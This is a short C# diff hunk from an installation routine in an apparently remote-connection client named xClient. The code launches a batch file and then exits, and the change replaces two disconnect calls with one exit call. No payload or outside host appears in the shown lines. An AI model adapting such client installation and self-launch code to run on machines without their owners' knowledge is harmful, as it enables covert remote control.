@@ -35,8 +35,8 @@ namespace xClient.Core.Installation
                     FileName = batchFile
                 };
                 Process.Start(startInfo);
-                ClientData.Disconnect = true;
-                client.Disconnect();
+
+                Program.ConnectClient.Exit();
             }
             catch (Exception ex)
             {
